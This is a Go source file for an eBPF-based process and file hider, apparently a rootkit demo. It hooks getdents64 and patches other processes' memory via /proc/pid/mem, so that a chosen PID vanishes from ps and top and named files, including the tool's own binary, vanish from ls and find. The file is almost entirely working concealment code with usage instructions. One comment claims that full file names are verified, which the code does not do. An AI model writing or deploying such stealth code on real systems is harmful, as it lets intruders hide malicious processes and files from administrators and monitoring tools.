// SPDX-License-Identifier: GPL-2.0
// ebpf-hide-proc: hide processes and files using eBPF + /proc/pid/mem patching
//
// Architecture:
//   Kernel eBPF: hooks getdents64, scans dirent buffer using fast u64 comparison,
//                sends match events via ringbuf (PID match or file name match)
//   Go userspace: receives events, patches caller memory via /proc/pid/mem
//
// Usage:
//   sudo ./ebpf-hide-proc                           # hide self (process only)
//   sudo ./ebpf-hide-proc -pid 1234                 # hide PID 1234
//   sudo ./ebpf-hide-proc -hide-file secret.txt     # hide file (repeatable)
//   sudo ./ebpf-hide-proc -hide-self-file            # hide own binary
//   sudo ./ebpf-hide-proc -hide-file a -hide-file b  # hide multiple files

package main

//go:generate go run github.com/cilium/ebpf/cmd/bpf2go -cc clang -cflags "-O2 -g -Wall -target bpf" -target amd64 hideProc ./bpf/hide_proc.c

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/ringbuf"
	"github.com/cilium/ebpf/rlimit"
)

const nameMax = 64

const (
	evtHidePID  = 1
	evtHideFile = 2
)

type hideEvent struct {
	EvtType   uint8
	Pad0      [3]byte
	CallerPID uint32
	CallerTID uint32
	Pad1      uint32
	BufAddr   uint64
	EntryOff  uint64
	EntryRecl uint16
	PrevRecl  uint16
	Pad2      uint32
	PrevOff   uint64
	TotalSize int64
	DName     [nameMax]byte
}

// Multi-value flag for -hide-file
type stringSlice []string

func (s *stringSlice) String() string { return strings.Join(*s, ", ") }
func (s *stringSlice) Set(v string) error {
	*s = append(*s, v)
	return nil
}

func main() {
	var targetPID int
	var hideFiles stringSlice
	var hideSelfFile bool

	flag.IntVar(&targetPID, "pid", 0, "PID to hide (default: self)")
	flag.Var(&hideFiles, "hide-file", "file name to hide (repeatable)")
	flag.BoolVar(&hideSelfFile, "hide-self-file", false, "hide own binary file")
	flag.Parse()

	if targetPID == 0 {
		targetPID = os.Getpid()
	}

	// If hiding self file, add our binary name
	if hideSelfFile {
		exe, err := os.Executable()
		if err == nil {
			hideFiles = append(hideFiles, filepath.Base(exe))
		}
	}

	pidStr := strconv.Itoa(targetPID)
	doFile := len(hideFiles) > 0

	log.Printf("=== eBPF Process & File Hider Demo ===")
	log.Printf("Target PID: %d (%s)", targetPID, pidStr)
	log.Printf("My PID:     %d", os.Getpid())
	if doFile {
		log.Printf("Hide files: %v", []string(hideFiles))
	}

	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatalf("memlock: %v", err)
	}

	objs := hideProcObjects{}
	if err := loadHideProcObjects(&objs, nil); err != nil {
		log.Fatalf("load eBPF: %v", err)
	}
	defer objs.Close()

	// --- PID setup ---
	var pidVal, pidMask uint64
	pidBytes := []byte(pidStr + "\x00")
	for i := 0; i < len(pidBytes) && i < 8; i++ {
		pidVal |= uint64(pidBytes[i]) << (i * 8)
		pidMask |= 0xFF << (i * 8)
	}
	log.Printf("PID match: val=0x%016x mask=0x%016x", pidVal, pidMask)

	valBuf := make([]byte, 8)
	binary.LittleEndian.PutUint64(valBuf, pidVal)
	if err := objs.PidValMap.Put(uint32(0), valBuf); err != nil {
		log.Fatalf("set pid val: %v", err)
	}
	maskBuf := make([]byte, 8)
	binary.LittleEndian.PutUint64(maskBuf, pidMask)
	if err := objs.PidMaskMap.Put(uint32(0), maskBuf); err != nil {
		log.Fatalf("set pid mask: %v", err)
	}

	// --- File name setup ---
	if doFile {
		for _, fname := range hideFiles {
			key, mask := encodeNameU64(fname)
			keyBuf := make([]byte, 8)
			maskBufF := make([]byte, 8)
			binary.LittleEndian.PutUint64(keyBuf, key)
			binary.LittleEndian.PutUint64(maskBufF, mask)
			if err := objs.FileNameMap.Put(keyBuf, maskBufF); err != nil {
				log.Fatalf("set file name '%s': %v", fname, err)
			}
			log.Printf("File match: '%s' key=0x%016x mask=0x%016x", fname, key, mask)
		}
	}

	// --- Feature flags ---
	pidFlag := uint32(1)
	if err := objs.FeatureMap.Put(uint32(0), pidFlag); err != nil {
		log.Fatalf("set feature pid: %v", err)
	}
	fileFlag := uint32(0)
	if doFile {
		fileFlag = 1
	}
	if err := objs.FeatureMap.Put(uint32(1), fileFlag); err != nil {
		log.Fatalf("set feature file: %v", err)
	}

	// --- Attach tracepoints ---
	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64",
		objs.TracepointSysEnterGetdents64, nil)
	if err != nil {
		log.Fatalf("attach enter: %v", err)
	}
	defer tpEnter.Close()

	tpExit, err := link.Tracepoint("syscalls", "sys_exit_getdents64",
		objs.TracepointSysExitGetdents64, nil)
	if err != nil {
		log.Fatalf("attach exit: %v", err)
	}
	defer tpExit.Close()

	rd, err := ringbuf.NewReader(objs.Events)
	if err != nil {
		log.Fatalf("ringbuf: %v", err)
	}
	defer rd.Close()

	log.Println("eBPF attached!")
	log.Println()
	log.Printf(">>> Process %d is now HIDDEN from ps / top <<<", targetPID)
	if doFile {
		log.Printf(">>> Files %v are now HIDDEN from ls / find <<<", []string(hideFiles))
	}
	log.Println()
	log.Printf("Verify:  ps aux | grep %d", targetPID)
	if doFile {
		log.Printf("Verify:  ls -la <dir-containing-hidden-file>")
	}
	log.Println("Press Ctrl+C to stop.")

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		log.Printf("\nStopping. PID %d visible again.", targetPID)
		rd.Close()
	}()

	pidCnt, fileCnt := 0, 0
	for {
		rec, err := rd.Read()
		if err != nil {
			if err.Error() == "ringbuf reader was closed" {
				break
			}
			continue
		}

		var ev hideEvent
		if err := binary.Read(bytes.NewReader(rec.RawSample),
			binary.LittleEndian, &ev); err != nil {
			continue
		}

		if patchMem(&ev) {
			name := string(bytes.TrimRight(ev.DName[:], "\x00"))
			switch ev.EvtType {
			case evtHidePID:
				pidCnt++
				log.Printf("[hide-pid #%d] Removed '%s' from PID %d's readdir (offset=%d)",
					pidCnt, name, ev.CallerPID, ev.EntryOff)
			case evtHideFile:
				fileCnt++
				log.Printf("[hide-file #%d] Removed '%s' from PID %d's readdir (offset=%d)",
					fileCnt, name, ev.CallerPID, ev.EntryOff)
			default:
				log.Printf("[hide] Removed '%s' from PID %d (type=%d)", name, ev.CallerPID, ev.EvtType)
			}
		}
	}
	log.Printf("Total hides: pid=%d file=%d", pidCnt, fileCnt)
}

// encodeNameU64 encodes a file name's first 8 bytes as a u64 key.
// The mask ensures only the relevant bytes are compared in BPF.
// For names <= 7 chars, the null terminator is included for exact match.
// For names > 7 chars, only prefix match on first 8 bytes (BPF will emit event,
// Go side does full name verification).
func encodeNameU64(name string) (val, mask uint64) {
	// Include null terminator for short names to avoid prefix collisions
	nameBytes := []byte(name + "\x00")
	n := len(nameBytes)
	if n > 8 {
		// Only first 8 bytes — Go userspace will verify full name
		n = 8
		nameBytes = []byte(name)[:8]
	}
	for i := 0; i < n; i++ {
		val |= uint64(nameBytes[i]) << (i * 8)
		mask |= 0xFF << (i * 8)
	}
	return
}

func patchMem(ev *hideEvent) bool {
	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", ev.CallerPID), os.O_RDWR, 0)
	if err != nil {
		return false
	}
	defer f.Close()

	maxBad := uint64(0xFFFFFFFF00000000)
	if ev.PrevOff < maxBad && ev.PrevRecl > 0 {
		addr := int64(ev.BufAddr + ev.PrevOff + 16)
		buf := make([]byte, 2)
		if _, err := f.ReadAt(buf, addr); err != nil {
			return false
		}
		cur := binary.LittleEndian.Uint16(buf)
		binary.LittleEndian.PutUint16(buf, cur+ev.EntryRecl)
		_, err := f.WriteAt(buf, addr)
		return err == nil
	}

	_, err = f.WriteAt(make([]byte, 8), int64(ev.BufAddr+ev.EntryOff))
	return err == nil
}
